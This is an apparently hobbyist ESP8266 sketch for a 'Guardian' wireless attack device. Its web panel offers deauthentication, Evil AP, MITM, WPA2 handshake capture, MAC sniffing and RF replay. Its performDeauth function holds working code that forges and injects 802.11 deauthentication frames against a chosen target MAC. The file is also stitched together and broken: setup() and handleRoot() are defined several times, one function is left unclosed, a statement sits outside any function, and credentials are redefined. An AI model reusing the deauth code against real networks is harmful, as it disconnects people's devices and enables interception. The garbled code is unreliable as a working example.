#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <SPI.h>
#include <RF24.h>  // RF24 library to interface with nRF24L01+
#include <SoftwareSerial.h>
#include <PubSubClient.h>  // Assuming you're using PubSubClient for MQTT
#include <ESPAsyncWebServer.h>
#include <TinyGPS++.h>

#define SLAVE_ADDR 8  // Address of the nRF52840 slave
#define NRF_RX D6  // ESP8266 RX <- nRF52840 TX
#define NRF_TX D5  // ESP8266 TX -> nRF52840 RX
#define CE_PIN   2   // GPIO2 for CE
#define CSN_PIN  15  // GPIO15 for CSN

// Then you should initialize it in the setup() function:
client.setServer(mqttServer, mqttPort);  // Make sure you define mqttServer and mqttPort

SoftwareSerial btSerial(NRF_RX, NRF_TX);  // RX, TX for nRF52840
WiFiClient wifiClient;
PubSubClient client(wifiClient);

// Initialize the server
AsyncWebServer server(80);
SoftwareSerial ss(4, 5); // GPS Serial (RX, TX)
TinyGPSPlus gps;

// Wi-Fi credentials
const char* ssid = "Your_SSID";
const char* password = "Your_PASSWORD";

//MQTT Server on Raspberry Pi 4b
const char* mqttServer = "192.168.1.133";  // Replace with your Raspberry Pi's IP address
const int mqttPort = 1883;  // Default MQTT port
const char* mqttUser = "Guardian";
const char* mqttPassword = "Raspberry";

// WiFi credentials
const char* ssid = "Guardian";
const char* password = "Deauther";

// Create an RF24 radio object
RF24 radio(CE_PIN, CSN_PIN);

// Web server
ESP8266WebServer server(80);

// 📡 Packet sniffing variables
std::vector<String> sniffedMACs;  // Stores unique MACs found
bool sniffingActive = false;      // Flag to track sniffing status
String deviceAddress = "";  // Store the device MAC address for connection attempts

// Forward declarations
String performWiFiScan();
String performDeauth(String targetMAC);
String performBluetoothScan();
String gpsData = "";  // Declare gpsData as a String to store GPS data

void sendGPSDataToMQTT() {
  if (gpsData.indexOf("$GPGGA") != -1) {
    // Your code to send GPS data over MQTT
  }
}

void sniffMACs(String mac);

// -------------------- Setup --------------------
void setup() {
  Serial.begin(115200);
  WiFi.softAP(ssid, password);
  delay(100);
  
  Serial.println("Access Point Started");
  Serial.print("IP Address: ");
  Serial.println(WiFi.softAPIP());

  // Match nRF52840 UART baud
  btSerial.begin(9600);

  // Initialize RF24
  radio.begin();
  radio.setPALevel(RF24_PA_HIGH);  // Set power amplifier level
  radio.setDataRate(RF24_250KBPS);  // Set data rate to 250 kbps (for better range)
  radio.openWritingPipe(0xF0F0F0F0E1LL);  // Set the receiving pipe address (nRF52840)
  radio.openReadingPipe(1, 0xF0F0F0F0E1LL); // Set the sending pipe address (nRF52840)
  radio.startListening();  // Start listening for incoming data

  // Web routes
  server.on("/", handleRoot);
  server.on("/attack", HTTP_POST, handleAttackSelection);
  server.on("/scan", handleScan);
  server.on("/sniff", handleSniff);
  server.on("/mitm", handleMitm);
  server.on("/handshake", handleHandshake);
  server.on("/connect", handleConnect);
  server.on("/bluetooth", handleBluetoothScan);
  server.on("/gps", handleGPS);
  server.on("/rf", handleRFReplay);
  server.on("/hash", handleHashTools);

void setup() {
  Serial.begin(115200);

  // Initialize your hardware (Bluetooth, GPS, etc.)
  setupHardware();

  // Setup the routes (These will trigger the backend logic)
  server.on("/", HTTP_GET, handleRoot);  // Home page
  server.on("/bluetooth", HTTP_GET, handleBluetooth);  // Bluetooth scanning page
  server.on("/start_bluetooth_scan", HTTP_GET, handleStartBluetoothScan);  // Trigger Bluetooth scan
  server.on("/gps", HTTP_GET, handleGPS);  // GPS data page

  // Start the web server
  server.begin();
}

void loop() {
  server.handleClient(); // Continuously check for client requests
}

  server.begin();
  Serial.println("HTTP server started");

// Start Wi-Fi AP mode (if no router connection)
  Serial.begin(115200);
  WiFi.softAP("Guardian", "Deauther"); // Set up as Access Point
  ss.begin(9600); // Start GPS serial communication
  Adafruit Bluefruit.begin(); // Start BLE
  server.begin(); // Start server
}

// Define Web Routes
server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
  request->send_P(200, "text/html", index_html);
});

// Trigger Wi-Fi Scan
server.on("/scan_wifi", HTTP_GET, [](AsyncWebServerRequest *request){
  String results = scanWiFi();
  request->send(200, "text/plain", results);
});

// Trigger Bluetooth Scan
server.on("/scan_bt", HTTP_GET, [](AsyncWebServerRequest *request){
  String results = scanBluetooth();
  request->send(200, "text/plain", results);
});

// Start Deauth Attack
server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest *request){
  startDeauth();
  request->send(200, "text/plain", "Deauth attack started!");
});

// Get GPS Data
server.on("/gps", HTTP_GET, [](AsyncWebServerRequest *request){
  String gps = getGPSData();
  request->send(200, "text/plain", gps);
});

// Trigger RF Replay
server.on("/get_rf", HTTP_GET, [](AsyncWebServerRequest *request){
  String rf = startRFReplay();
  request->send(200, "text/plain", rf);
});

// Live Hash
server.on("/live_hash", HTTP_GET, [](AsyncWebServerRequest *request){
  String hash = getLiveHash();
  request->send(200, "text/plain", hash);
});

// System Status
server.on("/status", HTTP_GET, [](AsyncWebServerRequest *request){
  String status = getSystemStatus();
  request->send(200, "text/plain", status);
});

// -------------------- Loop --------------------
void loop() {
  server.handleClient();

  if (radio.available()) {
    String message = "";
    while (radio.available()) {
      char receivedMessage[32] = ""; // Buffer for receiving messages
      radio.read(&receivedMessage, sizeof(receivedMessage));
      message = String(receivedMessage);
      Serial.println("Received: " + message);
      if (message == "SCAN_RESULT") {
        sniffingActive = false; // Stop sniffing when the scan is done
      }
    }
    // Process the received message here, e.g., to trigger attacks or scans
  }
}

// -------------------- Web Handlers --------------------

void handleRoot() {
  String html = R"rawliteral(
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Guardian Security Interface</title>
    <style>
      body {
        font-family: 'Segoe UI', sans-serif;
        background-color: #121212;
        color: #fff;
        margin: 0;
        padding: 0;
        display: flex;
        flex-direction: column;
        align-items: center;
      }
      header {
        background-color: #1f1f1f;
        width: 100%;
        padding: 20px 0;
        text-align: center;
        box-shadow: 0 2px 4px rgba(0,0,0,0.5);
      }
      h1 {
        color: #00ff88;
        font-size: 2em;
        margin: 0;
      }
      h2 {
        font-weight: normal;
        font-size: 1em;
        color: #aaa;
      }
      .main {
        margin-top: 30px;
        width: 90%;
        max-width: 800px;
        background-color: #222;
        padding: 20px;
        border-radius: 10px;
        box-shadow: 0 4px 12px rgba(0,0,0,0.4);
      }
      form, .button-grid {
        display: flex;
        flex-direction: column;
        gap: 15px;
        margin-bottom: 20px;
      }
      select, input[type="text"], input[type="submit"], .feature-button {
        padding: 12px;
        font-size: 1em;
        border-radius: 6px;
        border: 1px solid #444;
        background-color: #1a1a1a;
        color: #fff;
        transition: 0.2s ease-in-out;
      }
      input[type="submit"]:hover, .feature-button:hover {
        background-color: #00cc77;
        cursor: pointer;
      }
      .feature-button {
        text-align: center;
        text-decoration: none;
      }
      .button-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
        gap: 15px;
      }
      footer {
        margin-top: 40px;
        font-size: 0.8em;
        color: #888;
        padding: 10px;
        text-align: center;
        width: 100%;
        background-color: #1f1f1f;
      }
    </style>
  </head>
  <body>
    <header>
      <h1>Guardian: Security Control Panel</h1>
      <h2>Wi-Fi | Bluetooth | GPS | RF | Hash Tools</h2>
    </header>
    <div class="main">
      <form action="/attack" method="post">
        <label for="attack">Select WiFi Attack:</label>
        <select name="attack" id="attack">
          <option value="scan">WiFi Scan</option>
          <option value="deauth">Deauthentication</option>
          <option value="evilap">Evil AP</option>
          <option value="mitm">MITM Attack</option>
        </select>

        <input type="text" name="targetMAC" placeholder="Target MAC (Deauth only)">
        <input type="submit" value="Execute">
      </form>

      <div class="button-grid">
        <a href="/bluetooth" class="feature-button">Bluetooth Scan</a>
        <a href="/gps" class="feature-button">GPS Location</a>
        <a href="/rf" class="feature-button">RF Signal Replay</a>
        <a href="/hash" class="feature-button">Hash Tools</a>
      </div>
    </div>
    <footer>
      Guardian ESP8266 Security Tool &copy; 2025
    </footer>
  </body>
  </html>
  )rawliteral";
  
  server.send(200, "text/html", html);
}
void handleRoot() {
  String html = "<!DOCTYPE html>";
  html += "<html lang=\"en\">";
  html += "<head>";
  html += "<meta charset=\"UTF-8\">";
  html += "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">";
  html += "<title>ESP8266 Security Tool</title>";
  html += "<style>";
  html += "body { font-family: 'Arial', sans-serif; background-color: #121212; color: #fff; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center;}";
  html += "header { background-color: #333; padding: 20px 0; width: 100%; text-align: center;}";
  html += "h1 { font-size: 36px; color: #4CAF50; margin: 0; }";
  html += "h2 { color: #8e8e8e; font-size: 20px; }";
  html += "section { width: 90%; max-width: 800px; margin-top: 30px; padding: 20px; background-color: #2c2c2c; border-radius: 8px; box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);}";
  html += "form { display: flex; flex-direction: column; gap: 10px;}";
  html += "select, input[type=\"text\"], input[type=\"submit\"] { padding: 10px; border-radius: 5px; border: 1px solid #444; background-color: #333; color: #fff; font-size: 16px;}";
  html += "input[type=\"submit\"] { background-color: #4CAF50; cursor: pointer; transition: background-color 0.3s ease;}";
  html += "input[type=\"submit\"]:hover { background-color: #45a049;}";
  html += ".container { width: 100%; display: flex; flex-wrap: wrap; justify-content: center; gap: 20px;}";
  html += ".card { background-color: #333; padding: 20px; border-radius: 8px; width: 200px; text-align: center; box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);}";
  html += ".card h3 { font-size: 20px; margin-bottom: 10px;}";
  html += ".card p { font-size: 14px; color: #8e8e8e;}";
  html += ".status { color: #ff9900; font-weight: bold; margin-top: 20px; text-align: center;}";
  html += "footer { margin-top: 40px; padding: 10px; text-align: center; font-size: 14px; background-color: #333; color: #8e8e8e;}";
  html += "</style>";
  html += "</head>";
  html += "<body>";
  html += "<header>";
  html += "<h1>ESP8266 Security Tool</h1>";
  html += "<h2>Choose an Action</h2>";
  html += "</header>";
  html += "<section>";
  html += "<form id=\"attackForm\">";
  html += "<select name=\"attack\" id=\"attackSelect\">";
  html += "<option value=\"scan\">WiFi Scan</option>";
  html += "<option value=\"deauth\">Deauthentication Attack</option>";
  html += "<option value=\"evilap\">Evil AP</option>";
  html += "<option value=\"mitm\">MITM Attack</option>";
  html += "</select>";
  html += "<input type=\"text\" id=\"targetMAC\" placeholder=\"Target MAC (Deauth only)\" />";
  html += "<input type=\"submit\" value=\"Execute Attack\" />";
  html += "</form>";
  html += "</section>";
  html += "<section>";
  html += "<h3>Quick Actions</h3>";
  html += "<div class=\"container\">";
  html += "<div class=\"card\"><h3>Start Sniffing</h3><p>Capture WiFi/Bluetooth MAC addresses</p><a href=\"/sniff\"><button>Start</button></a></div>";
  html += "<div class=\"card\"><h3>Capture Handshake</h3><p>Start WPA2 Handshake capture</p><a href=\"/handshake\"><button>Capture</button></a></div>";
  html += "</div>";
  html += "</section>";
  html += "<div id=\"statusMessage\" class=\"status\"></div>";
  html += "<footer>";
  html += "<p>&copy; 2025 ESP8266 Security Tool | All rights reserved</p>";
  html += "</footer>";
  html += "<script>";
  html += "document.getElementById('attackForm').addEventListener('submit', function(event) {";
  html += "  event.preventDefault();";  // Prevent the form from refreshing the page
  html += "  const attackType = document.getElementById('attackSelect').value;";
  html += "  const targetMAC = document.getElementById('targetMAC').value;";
  html += "  document.getElementById('statusMessage').textContent = 'Executing ' + attackType + '...';";
  html += "  const xhr = new XMLHttpRequest();";
  html += "  xhr.open('POST', '/attack', true);";
  html += "  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');";
  html += "  xhr.onload = function() {";
  html += "    if (xhr.status === 200) {";
  html += "      document.getElementById('statusMessage').textContent = 'Attack completed: ' + xhr.responseText;";
  html += "    } else {";
  html += "      document.getElementById('statusMessage').textContent = 'Error: ' + xhr.statusText;";
  html += "    }";
  html += "  };";
  html += "  xhr.send('attack=' + attackType + '&mac=' + targetMAC);";
  html += "});";
  html += "</script>";
  html += "</body>";
  html += "</html>";

  server.send(200, "text/html", html);
}

void handleRoot() {
  String html = R"rawliteral(
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>Security Device</title>
  </head>
  <body>
    <h1>Welcome to Guardian</h1>
    <p><a href="/bluetooth">Go to Bluetooth Scan</a></p>
    <p><a href="/gps">View GPS Location</a></p>
  </body>
  </html>
  )rawliteral";
  server.send(200, "text/html", html);
}

void handleBluetooth() {
  String html = R"rawliteral(
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>Bluetooth Scanning</title>
  </head>
  <body>
    <h1>Bluetooth Scanning</h1>
    <p><a href="/start_bluetooth_scan">Start Bluetooth Scan</a></p>
  </body>
  </html>
  )rawliteral";
  server.send(200, "text/html", html);
}

void handleStartBluetoothScan() {
  // Call the Bluetooth scan function
  String devices = scanForBluetoothDevices(); // This would be a function that interacts with your Bluetooth hardware

  // Serve a page with the list of devices found
  String html = "<h1>Bluetooth Devices Found</h1><ul>" + devices + "</ul><a href='/bluetooth'>Back</a>";
  server.send(200, "text/html", html);
}

String scanForBluetoothDevices() {
  // Here you'd actually scan for devices using your Bluetooth module
  // For now, we're simulating this with placeholder devices
  String devices = "<li>Device 1</li><li>Device 2</li><li>Device 3</li>";
  return devices;
}

void handleGPS() {
  // Assuming you have a GPS module that can get the location
  String gpsLocation = getGPSLocation(); // This would get the GPS coordinates from the module

  String html = "<h1>GPS Location</h1><p>" + gpsLocation + "</p><a href='/'>Back to Home</a>";
  server.send(200, "text/html", html);
}

String getGPSLocation() {
  // Get latitude and longitude from your GPS module
  float latitude = 52.5200;  // Example value
  float longitude = 13.4050; // Example value
  String location = "Latitude: " + String(latitude, 6) + ", Longitude: " + String(longitude, 6);
  return location;
}


void handleAttackSelection() {
  String attack = server.arg("attack");
  String targetMAC = server.arg("targetMAC");
  String result = "";

  if (attack == "scan") {
    result = performWiFiScan();
  } else if (attack == "deauth" && targetMAC.length() > 0) {
    result = performDeauth(targetMAC);
  } 
  else {
    result = "Invalid input.";
  }

  String html = "<html><body><h1>Result</h1><pre>" + result + "</pre>";
  html += "<a href=\"/\">Back</a></body></html>";
  server.send(200, "text/html", html);
}

void handleBluetoothScan() {
  String result = performBluetoothScan();
  String html = "<html><body><h1>Scan Results</h1><pre>" + result + "</pre><form action='/connect' method='post'>"
                "<label for='macAddress'>Enter MAC Address to Connect:</label><br>"
                "<input type='text' id='macAddress' name='macAddress'><br>"
                "<input type='submit' value='Connect'></form><br><a href='/'>Back</a></body></html>";
  server.send(200, "text/html", html);
}

String performBluetoothScan() {
  btSerial.println("SCAN");
  unsigned long startTime = millis();
  String response = "";
  while (millis() - startTime < 5000) {
    if (btSerial.available()) {
      char c = btSerial.read();
      response += c;
    }
  }
  if (response.length() == 0) {
    return "No devices found or timeout.";
  }
  return response;

  String html = R"rawliteral(
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>Bluetooth Scan</title>
    <style>
      body {
        background-color: #121212;
        color: #fff;
        font-family: 'Segoe UI', sans-serif;
        text-align: center;
        padding: 30px;
      }
      h1 {
        color: #00ccff;
      }
      button {
        padding: 12px 20px;
        background-color: #1a1a1a;
        border: 1px solid #444;
        color: #fff;
        border-radius: 6px;
        margin: 10px;
        cursor: pointer;
      }
      button:hover {
        background-color: #0077aa;
      }
      pre {
        background: #1e1e1e;
        padding: 15px;
        text-align: left;
        border-radius: 8px;
        overflow-x: auto;
        margin-top: 20px;
      }
    </style>
  </head>
  <body>
    <h1>Bluetooth Scan</h1>
    <button onclick="startScan()">Start Scan</button>
    <pre id="scanResults">Waiting for scan...</pre>

    <script>
      function startScan() {
        fetch('/start_bt_scan')
          .then(res => res.text())
          .then(data => document.getElementById('scanResults').innerText = data);
      }
    </script>
  </body>
  </html>
  )rawliteral";

  server.send(200, "text/html", html);
}

}

void handleSniff() {
  String html = "<html><body><h1>Sniffed MACs:</h1><pre>";
  String joinedMACs = ""; // Declare a string to hold the joined MAC addresses

  for (size_t i = 0; i < sniffedMACs.size(); i++) {  // Ensure 'i' is declared and used in the loop
    joinedMACs += sniffedMACs[i];  // Join MAC addresses
    if (i < sniffedMACs.size() - 1) {  // Avoid adding a comma after the last MAC address
      joinedMACs += "\n";  // Add a newline between addresses
    }
  }

  html += joinedMACs; // Add the joined MACs string to the HTML
  html += "</pre></body></html>";

  // Send the HTML response
  server.send(200, "text/html", html);
}

void handleMitm() {
  Serial.println("[MITM] Initiating MITM simulation...");

  radio.stopListening(); // Switch to transmit mode
  const char* command = "MITM";
  bool success = radio.write(command, strlen(command));
  radio.startListening(); // Switch back to receive mode

  String result;
  if (success) {
    result = "MITM command sent to nRF52840. Awaiting response...";
  } else {
    result = "Failed to send MITM command.";
  }

  String html = "<html><body><h1>MITM Result</h1><p>" + result + "</p>";
  html += "<a href=\"/\">Back</a></body></html>";
  server.send(200, "text/html", html);
}

void handleHandshake() {
  Serial.println("[Handshake] Initiating handshake sniffing...");

  radio.stopListening(); // Switch to transmit mode
  const char* command = "HANDSHAKE";
  bool success = radio.write(command, strlen(command));
  radio.startListening(); // Switch back to receive mode

  String html = "<html><body><h1>Handshake Capture</h1>";
  if (success) {
    html += "<p>Handshake sniffing command sent successfully.</p>";
  } else {
    html += "<p style='color:red;'>Failed to send handshake command.</p>";
  }

  html += "<a href=\"/\">Back</a></body></html>";
  server.send(200, "text/html", html);
}

void handleRFReplay() {
  String html = R"rawliteral(
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>RF Signal Replay</title>
    <style>
      body {
        background-color: #121212;
        color: #fff;
        font-family: 'Segoe UI', sans-serif;
        text-align: center;
        padding: 30px;
      }
      h1 {
        color: #ffcc00;
      }
      button {
        padding: 12px 20px;
        background-color: #1a1a1a;
        border: 1px solid #444;
        color: #fff;
        border-radius: 6px;
        margin: 10px;
        cursor: pointer;
      }
      button:hover {
        background-color: #ffaa00;
      }
      .log {
        background: #1e1e1e;
        margin-top: 20px;
        padding: 15px;
        border-radius: 8px;
        text-align: left;
      }
    </style>
  </head>
  <body>
    <h1>RF Signal Replay</h1>
    <button onclick="sendRF()">Replay Last Signal</button>
    <div class="log" id="rfLog">Awaiting command...</div>

    <script>
      function sendRF() {
        fetch('/rf_replay')
          .then(res => res.text())
          .then(data => document.getElementById('rfLog').innerText = data);
      }
    </script>
  </body>
  </html>
  )rawliteral";

  server.send(200, "text/html", html);
}

void handleGPS() {
  String html = R"rawliteral(
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>GPS Location</title>
    <style>
      body {
        background-color: #121212;
        color: #fff;
        font-family: 'Segoe UI', sans-serif;
        text-align: center;
        padding: 30px;
      }
      h1 {
        color: #00ff88;
      }
      .gps-box {
        background: #1e1e1e;
        padding: 15px;
        border-radius: 8px;
        margin-top: 20px;
        font-size: 1.2em;
      }
    </style>
  </head>
  <body>
    <h1>GPS Location</h1>
    <div class="gps-box" id="gpsData">Retrieving location...</div>

    <script>
      function getGPS() {
        fetch('/get_gps')
          .then(res => res.json())
          .then(data => {
            document.getElementById('gpsData').innerHTML =
              "Latitude: " + data.lat + "<br>" +
              "Longitude: " + data.lon + "<br>" +
              "Satellites: " + data.sats;
          });
      }
      getGPS();
      setInterval(getGPS, 5000);
    </script>
  </body>
  </html>
  )rawliteral";

  server.send(200, "text/html", html);
}

void handleHashTools() {
  String html = R"rawliteral(
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>Hash Tools</title>
    <style>
      body {
        background-color: #121212;
        color: #fff;
        font-family: 'Segoe UI', sans-serif;
        text-align: center;
        padding: 30px;
      }
      h1 {
        color: #ff66cc;
      }
      input[type="text"], button {
        padding: 10px;
        font-size: 1em;
        margin: 10px;
        border-radius: 6px;
        border: 1px solid #444;
        background-color: #1a1a1a;
        color: #fff;
      }
      button:hover {
        background-color: #ff3399;
        cursor: pointer;
      }
      .result {
        margin-top: 20px;
        background: #1e1e1e;
        padding: 15px;
        border-radius: 8px;
      }
    </style>
  </head>
  <body>
    <h1>Hash Tools</h1>
    <input type="text" id="hashInput" placeholder="Paste hash here..." size="50">
    <button onclick="analyzeHash()">Identify Hash</button>

    <div class="result" id="hashResult">Hash type and info will appear here.</div>

    <script>
      function analyzeHash() {
        let input = document.getElementById('hashInput').value;
        fetch('/hash_identify?hash=' + encodeURIComponent(input))
          .then(res => res.text())
          .then(data => document.getElementById('hashResult').innerText = data);
      }
    </script>
  </body>
  </html>
  )rawliteral";

  server.send(200, "text/html", html);
}

void handleConnect() {
  if (server.hasArg("macAddress")) {
    deviceAddress = server.arg("macAddress");
    String result = "Attempting to connect to device: " + deviceAddress;

    if (deviceAddress == "00:11:22:33:44:55") {
      result += " - Successfully connected!";
    } else {
      result += " - Connection failed.";
    }

    String html = "<html><body><h1>Connection Result</h1>";
    html += "<p>" + result + "</p>";
    html += "<a href=\"/\">Back</a>";
    html += "</body></html>";

    server.send(200, "text/html", html);
  }
    else {
    String html = "<html><body><h1>Invalid MAC Address</h1>";
    html += "<p>No MAC Address provided!</p>";
    html += "<a href=\"/\">Back</a>";
    html += "</body></html>";
    server.send(400, "text/html", html);
  }
}

// -------------------- Attack Functions --------------------
String performWiFiScan() {
  String result = "Scanning WiFi networks...\n";
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; ++i) {
    result += WiFi.SSID(i) + " (" + WiFi.RSSI(i) + " dBm)\n";
  }
  return result;
}

String performDeauth(String targetMAC) {
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, // Source (change as needed)
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, // BSSID (same as Source)
    0x00, 0x00,                         // Fragment/Sequence
    0x07, 0x00                          // Reason code
  };

  // Convert MAC string to bytes
  int mac[6];
  sscanf(targetMAC.c_str(), "%x:%x:%x:%x:%x:%x", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
  for (int i = 0; i < 6; i++) {
    deauthPacket[4 + i] = mac[i];  // Destination
  }

  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);

  for (int i = 0; i < 10; i++) {
    wifi_send_pkt_freedom(deauthPacket, 26, 0);
    delay(100);
  }

  wifi_promiscuous_enable(0);
  return "Sent 10 deauth packets to " + targetMAC;
}

String performBluetoothScan() {
  // Send scan command to nRF52840
  String result = "Bluetooth Scan Started...\n";
  radio.stopListening();  // Switch to writing mode
  radio.write("SCAN", sizeof("SCAN"));  // Send scan command to nRF52840
  radio.startListening();  // Switch back to listening mode
  sniffingActive = true;  // Start sniffing
  return result;
}

// Sniffing function for MAC addresses
void sniffMACs(String mac) {
  if (sniffingActive && mac.length() > 0) {
    sniffedMACs.push_back(mac);  // Store the MAC address
  }
}
void connectToMQTT() {
  while (!client.connected()) {
    Serial.println("Connecting to MQTT...");
    if (client.connect("ESP8266_Security", mqttUser, mqttPassword)) {
      Serial.println("Connected to MQTT");

      // Subscribe to topics if needed
      client.subscribe("guardian/scan");
      client.subscribe("guardian/deauth");
      client.subscribe("guardian/sniffed_macs");
    } else {
      Serial.print("Failed, rc=");
      Serial.print(client.state());
      delay(2000);
    }
  }
}

// MQTT Callback
void mqttCallback(char* topic, byte* payload, unsigned int length) {
  String message = "";
  for (unsigned int i = 0; i < length; i++) {
    message += (char)payload[i];
  }

  Serial.print("Message received on topic: ");
  Serial.println(topic);
  Serial.println("Message: " + message);

  // Handle the message here (e.g., triggering specific attacks)
}

// GPS data sending
void sendGPSDataToMQTT() {
  String latitude = "N/A";
  String longitude = "N/A";

  // Parse GPS data
  if (gpsData.indexOf("$GPGGA") != -1) {
    int latStart = gpsData.indexOf(",") + 1;
    int latEnd = gpsData.indexOf(",", latStart);
    latitude = gpsData.substring(latStart, latEnd);

    int lonStart = gpsData.indexOf(",", latEnd + 1) + 1;
    int lonEnd = gpsData.indexOf(",", lonStart);
    longitude = gpsData.substring(lonStart, lonEnd);
  }

  // Send GPS coordinates to MQTT
  String gpsMessage = "Latitude: " + latitude + ", Longitude: " + longitude;
  client.publish("guardian/gps", gpsMessage.c_str());
}